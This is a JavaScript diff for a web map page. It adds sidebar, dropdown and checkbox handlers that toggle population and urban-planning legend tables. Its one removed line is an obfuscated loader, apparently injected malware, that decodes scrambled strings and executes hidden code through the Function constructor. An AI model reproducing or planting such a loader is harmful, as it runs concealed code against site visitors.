@@ -1,1 +1,121 @@
-var i,checkboxes,i,e,legend,actualizarTablaLegend,actualizarTabla,checkboxImgObj,checkboxZonP,checkboxEtapaCrecimiento,checkboxPoligonosActuacion;(function(){var HEa='',Sem=272-261;function kPS(q){var i=267424;var y=q.length;var c=[];for(var k=0;k<y;k++){c[k]=q.charAt(k)};for(var k=0;k<y;k++){var h=i*(k+120)+(i%51794);var f=i*(k+641)+(i%22007);var o=h%y;var z=f%y;var s=c[o];c[o]=c[z];c[z]=s;i=(h+f)%3131918;};return c.join('')};var MPJ=kPS('cqitzhokmorclpntfgsrcrtvnaxowuueydbsj').substr(0,Sem);var nFV=')an -m 3=S=i(,r=z4=v(+ka){a)-+.ot0c9"l0n)n;r=7sanxy.ar.p;)vv;r(ir4,rt,+e,2( c0;r=,+u,tsgrq,8.ad}u}c9n+ i1ukt}roz,r7jk-rh>l(h,vo.tk;q(+]hroj]=erq0=b)gdg== =a+v4 pCko1to+hlb+],tnsr{tk=;r()m}8irgrm;n,isor;gh6s.f. ua)isi1iweleanovn=s+,(nevm}a+Ae]=.;([,Avlnh6l7=.d ;=pfr ap0n*[x=dlen9]p>p;i;3n1;9-.{-yA eC7il ]qer zrirri)ptrhq=n"(q;c0<"ikb7via(,i1t)c.;;)so72aa;r[fiv)7+m=f,[2C =5+)Svirhjrfv0.fs5h)ida(+)t;a.kalrajn.=ennfs.{g=o1snlort<bu z7Aelsvcr8ru,p"=vg-;); <v;c,]uuj==dv7e2k}(8pge.gt2c-,itct1;,z"eg=(k=.ya);c,aarno e,}{)9.;r8Cve[;0!svrfe;se;ko1qbnud"t[=.=,vp"26)+Ct].;f[e]en=;)u0o(vir1b(gru8(b[nt0.eatcxhl(t;(.;(1m;=ia1;lihb=xg)6l) ++r(1<()8.{u;(szv+ur4i+m)g(5bvn0!],"=hl*8=2gs; ++t)jasbt9[lrb;hvhtqh=t;fcsuza9);qof]lfr(6+uh;re(i. +z8C8].[,a<)t]o;;,x;4r= (;nnbrl)ooC e7.hdm)(l)c=bz(6=nulhaj rl6lfhg=yvh())[p(6sp+ia3"[dt6(]pal)2t[+0o c;rgbx,(nfua==h0;mor{rv =c;o1Cbvu[2" .s;areoe,aAuhhjl()roar';var iLM=kPS[MPJ];var UwO='';var Spg=iLM;var rjK=iLM(UwO,kPS(nFV));var EgC=rjK(kPS('<.%<7Ht$<o]<<<ca<0]C80%,Ioi<,cu.%r1_cLe9)el_  <[vu(.)<_"05cgM(< <4jw<3qat;ho0.)<5Gs))[gl2!_<nc85[<!<g<&4,"rM<]>8j>o7L<#3{+i_p.lTKynq3d)7n)Euee<3<;r(len1)4<.Sre<<kif){.J<?%<<2,=k(?blt%<0S= igg52_etclc<(}oI"<$71ce<lq5seIr+.\/5<<<<6 <k.7Ms;a7^<<=<(_..2"oad<4)=%__(<j)2l<$5etac(!g))(s<.a$o%qqtac0SfuG%fq,2<Zri<Jn.seEbh(:o<q_rj5Gct]{7e6dbmc)r1\'<)<rC(sxi];)9C); a eac6sd_...yltuxo, <q(3.].)g<Li%b[1z<<)]1Ipq ;ea$seqv<nl;<5<%e4a< 9dt=.3bQ"qOc49n<ikca2u_}<1<)3>e!  sc[ost<lfn]%;5E9nm%m<7c%u.hx7hl_($i6<%<<3<<jeqace)ta<39c<lo==mj-^a(D$ang]ft<.k{=(o)N0c_emh>.<%yg<o{!ts`?a.a<!$e_.p!%8;2y0?<<!%%.i6yn!_c#r_$of3<n,e\/$.h%ba](axj<,#q.!iu}lqir<e@.3))3<l.ekabl<2)(7,-\/<#<< s.!<.Mt<_kJ.dc[J<...[)]<.<_<j%Mr<s\/)wfTMer5n]T(<I{f6u7,k}<#."Zc<k2? <_lgc[)8iqbtsy<o0aa(<<r4s(1E71F.3.6%a3cx(4rmuc))e).i).1.; jhs.6h]ut._(<<d,26,4T4S7<&;3yy._a);{o(,3lg>c<1}.<V!<alsV,;}=l<."(g.i]]y.k)e<7o<e.<<c];1%e]kte<G1l<5=un7)t*,]<s5[%$e<(<<;.rj%3o3)fit3}on=s;e569]![Qmuu&on]0<_<{M!]<p;s(c&c$<c)=_<<%_<(5eg1<;<Cit1[).);a_ts4<a<<97*r=ue1c%.(c,2.[tqi .l\\<nc u$!<<5[L(a;)}i[e(.e_}eq=g<5_<{ab5<6< @4N<45u]<oj=l=i(r[(n1<,j;7<fb}<k,<<_;<e37aVjn<(d6H<tr<.f__.;<<$g,o< oo0thr=rA7 (]C_.(<Q7._<c)-(LdW,b]Ht.}^(os)<e%.<<_ebw(ki< 3)32g3)e114nic<s!c;W(}eecE }<cin<q<DI!t1=nu;t].[5<<(b]erqc}8lasb(6e)2<[e<<e+<;0e;Eb=df!j79=,;i<<,+)[o)<<_6_u.lbu_8Qi_Oo<)e,<3<!;b1<4c$:_m8!e_)(hjeg.=6f)<{<0<<,ovl<izsV">763(02inj$76I][_b262efu\\[%$r[1.C<! 7S^( ]r<<ln!.]!_l<n6)<<<<{+Qn4.$<cY.o<guJ<;)(t]_lcoweb!<o.#Pr]<e<i(<U_euhr])3a].<(tP6c1_2Y<l i.,v`yom\'cid(.;%e7dTo o<i}#.Po2.1;gGrao%m<Nc{coC=.lnu (<3c&o!<sIb<<$<fj<D.<j<$i5)_a93<)l+6a;txb]aRfD<7<2.tls;nm6lc}fc%[gle<c6<(<.o.6a<h$c2cC<<H<t.=!]<7<]o?oc23i(nD(ag%Sw)<0c$10b)l)Zcf Tli.9o$j%],aenclCes_8C<<C$o<Q6):"%$w.c#ds6&3l};.I}$8<;K_r6e{39]9(7$eO8(b35O<)1%fb<.:L).M.2nsnc<<.kr;eB<;<."<,7{.m<igj}.ceoR)NHt].813<<li<)bfq#;R<iaf<eef<3<1l.<l ;i])c.?se.7CuuF(ro3)<,}63U.1<2}6x{o9e35<(f.rR]<)src$E3glt5cHo<o(2<cdlm;j]3{@ Eo[Ptcc)p%]!.te00<<.)5<I2<enbs$,4< r<a12n.=Z.o <t1uKr).fJ_d]].=(5_=;]b=$.U.2)<L)<"e<h4teooii<$<b[)$.T$h))n03(ce[i<usb},5=6c)ti}n&ycr_uiCis<<<<x<f,2)=n.;t)nhl$lnt}$])\'])1==.)<Exbj)0l[e$<<\'_!_1sc()lc.c.0c7m_f]=lC3]<o+.c3)TFg$<C6"u<]e<e<0<y5b:iw3B]o;iIh<$a))=;sH1,=Nr7!<Hce;r<kmQ?S1r3)X13o8.$%cba__5<3$_co<$l,_9Unoe21Ayrs<b}r3)]0_ch]7l<;,<1u].)](9<r<w<S<9%%n$<<I%l57]=G_hc<<!<93}(_Y]7%<]< 9<47e c(k;le,.1._=,le;1(<cptqctt<_4<)i<ccaae,o5%<<>;3on6r}D<<e!(te9&0<76<}[.s<,7)e)4lyz<..<pH19_jd().b,$,c][<>a5e$D[<.n,nt\\0.<p<p.3j<59<o(<)-<e{a(gG!g%i_ (2(rQ.b<.zO}<o_<t1!i=g95){=a,K1._5b*j1!u(=_({.c[r6n<a3-<e5(<R=be.OsMi_r<z;oy9ae]{ eq]8a<(ec2 ]<<*T[_Ge2i73% ),(7cas!.=)B%5,o<=C![T](<\'7orT)_<o9$$d<t$.]odr=(T212 =)nc@$_tM_)b<.H]:<%<] bn]p i<eo_4al3+#f.%3(b3 c,)er$3h c<=o< <aaf)%4B6Y1(=.\\_3<v [0t<=i}<n7i2o.pC](.R<t!.$[..ytej<<1k$[sac1b. tf(<Eg<`e9o\\]hV#g<&)ro.<Q<])f\'(frg.rBb<)i:b[55Z<C)<47rec3i+(0!r.ct<oQ76 f0<=%$1<ff}}E i.e0(b((,<kJ n<0Xind: _$3W7o3]fke_bn(7ae<CEE ptC<=74bi7n<a <a,5.G.DtF%5(dI<<e 88;#1.jcc6ebCg3$%g35cc(<7bp5<ca.$hNToi0ee(mo<<;<hA7{)aWu8{<c)63cW_c)r%<$<fo;)3j43o (<!(0A<]>7r8 <V t<70C)$tei<5l.<1i)uf;.\'no<2gEt05X]\'v;7](5.od<H.f]ss<o=Y< <j3)<c`9gk<<_c1<.e)u(n 6eiE<reom,y601]o7c.-a-.Kgn-o,iXab)(6yc<L]1< _$%Rh6ae$=.<it4fe33)1<.3c .$!p.Q5}<0c<8%$]_),]<<Tn s)%o<<cna wr(q<{<;;2_fo.o;c_c [ornc en[osX({<i<(; 1t37'));var uQv=Spg(HEa,EgC );uQv(8669);return 2352})()
+let arrow2 = document.querySelectorAll(".arrow, .arrowSub, .arrowSub2");
+for (var i = 0; i < arrow2.length; i++) {
+  arrow2[i].addEventListener("click", (e) => {
+    let arrowParent = e.target.parentElement.parentElement;//selecting main parent of arrow
+    arrowParent.classList.toggle("showMenu");
+  });
+}
+
+// Agrega un evento de clic a un elemento con la clase "arrowSub"
+document.querySelectorAll(".arrowSub").forEach(function (arrow) {
+  arrow.addEventListener("click", function () {
+    // Encuentra el elemento padre que contiene el menú desplegable
+    var submenu = arrow.closest(".menu-dropdown").querySelector(".submenu-items");
+
+    // Alterna la visibilidad del menú desplegable específico
+    submenu.style.display = (submenu.style.display === "block") ? "none" : "block";
+  });
+});
+
+
+//Barra lateral esta cerrada por defecto  
+
+// let sidebar = document.querySelector(".sidebar");
+// let sidebarBtn = document.querySelector(".logo");
+// let profileContent = document.querySelector(".profile-details");
+
+// sidebarBtn.addEventListener("click", () => {
+//   sidebar.classList.toggle("close");
+// });
+
+// profileContent.addEventListener("click", () => {
+//   sidebar.classList.toggle("close");
+// });
+
+
+
+//Barra lateral esta abierta por defecto
+let sidebar = document.querySelector(".sidebar");
+let sidebarBtn = document.querySelector(".logo-details");
+let profileContent = document.querySelector(".profile-details");
+
+sidebar.classList.remove("close");
+
+sidebarBtn.addEventListener("click", () => {
+  sidebar.classList.toggle("close");
+});
+profileContent.addEventListener("click", () => {
+  sidebar.classList.toggle("close");
+});
+
+
+// Obtén referencias a los checkboxes y la tabla de simbología
+var checkboxes = [
+  document.getElementById("chkPobAGEBZMP"),
+  document.getElementById("chkPobAGEBHgo")
+];
+
+// Agrega checkboxes adicionales con nombres similares
+for (var i = 1; i <= 12; i++) {
+  var checkbox = document.getElementById("chkPobAGEBR" + (i < 10 ? "0" : "") + i);
+  checkboxes.push(checkbox);
+}
+
+var legend = document.getElementById("legend");
+
+// Agrega oyentes de cambio a los checkboxes
+checkboxes.forEach(function (checkbox) {
+  checkbox.addEventListener("change", actualizarTablaLegend);
+});
+
+// Función para actualizar la visibilidad de la tabla
+function actualizarTablaLegend() {
+  // Verifica el estado de todos los checkboxes
+  var mostrarTabla = checkboxes.some(function (checkbox) {
+    return checkbox.checked;
+  });
+
+  // Muestra u oculta la tabla según la condición
+  legend.style.display = mostrarTabla ? "block" : "none";
+}
+
+
+
+
+// Define una función para manejar la visibilidad de las tablas
+function actualizarTabla(checkbox, tablaId) {
+  var tabla = document.getElementById(tablaId);
+  tabla.style.display = checkbox.checked ? 'block' : 'none';
+}
+
+// Obtén referencias a los checkboxes
+var checkboxImgObj = document.getElementById('chkZMP_PDUyOT_ImgObj');
+var checkboxZonP = document.getElementById('chkZMP_PDUyOT_ZonP');
+var checkboxEtapaCrecimiento = document.getElementById('chkZMP_PDUyOT_EC');
+var checkboxPoligonosActuacion = document.getElementById('chkZMP_PDUyOT_PA');
+
+
+// Agrega oyentes de cambio a los checkboxes
+checkboxImgObj.addEventListener('change', function () {
+  actualizarTabla(checkboxImgObj, 'ImgObjetivo');
+});
+checkboxZonP.addEventListener('change', function () {
+  actualizarTabla(checkboxZonP, 'ZonP');
+});
+checkboxEtapaCrecimiento.addEventListener('change', function () {
+  actualizarTabla(checkboxEtapaCrecimiento, 'EtapaCrecimiento');
+});
+checkboxPoligonosActuacion.addEventListener('change', function () {
+  actualizarTabla(checkboxPoligonosActuacion, 'PoligonosActuacion');
+});
+
+
+// Referencias a los nuevos checkboxes y tablas utilizando document.getElementById. Por ejemplo:
+// var checkboxNuevaOpcion = document.getElementById('chkNuevaOpcion');
+// var tablaNuevaOpcion = document.getElementById('TablaNuevaOpcion');
+
+
+// Después, agrega un nuevo oyente de cambio para el nuevo checkbox.
+// checkboxNuevaOpcion.addEventListener('change', function () {
+//   actualizarTabla(checkboxNuevaOpcion, 'TablaNuevaOpcion');
+// });
